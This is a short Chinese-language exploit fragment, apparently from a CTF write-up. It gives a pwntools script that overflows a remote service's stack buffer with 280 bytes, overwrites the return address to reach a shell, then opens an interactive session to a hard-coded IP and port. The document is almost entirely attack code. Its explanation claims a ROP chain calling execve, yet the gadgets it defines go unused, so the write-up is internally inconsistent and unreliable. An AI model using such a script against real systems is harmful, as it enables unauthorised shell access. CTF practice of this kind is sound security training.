漏洞利用

pwntools 执行 ret2syscall，offset = 0x110 + 8 = 280，ROP 链调用 execve("/bin/bash", 0, 0)。

from pwn import *
from sys import *

context.arch = 'amd64'
context.log_level = 'debug'

p = remote('39.106.48.123', 10004)

shell = 0x0000000000400714
len = 0x110 + 8

pop_rax = 0x4005fb
pop_rdi = 0x4005ff
pop_rsi = 0x400601
pop_rdx = 0x400603
pop_rcx = 0x400605
syscall = 0x400550

payload = b'A' * len + p64(shell)
p.sendline(payload)
p.interactive()
